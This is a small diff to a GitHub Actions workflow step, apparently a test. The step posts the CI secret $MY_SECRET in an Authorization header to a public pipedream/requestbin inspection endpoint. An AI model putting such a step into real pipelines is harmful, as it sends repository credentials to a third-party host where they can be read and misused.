@@ -17,5 +17,5 @@ jobs:
       - name: Send POST request
         # Inspect requests at https://public.requestbin.com/r/enw9z3kw0afbh
         run: |
-          curl -X POST "https://enw9z3kw0afbh.x.pipedream.net" \
-          -H "Authorization: $MY_SECRET"
+          curl -X POST -H "Authorization: $MY_SECRET" "https://enw9z3kw0afbh.x.pipedream.net"
+          
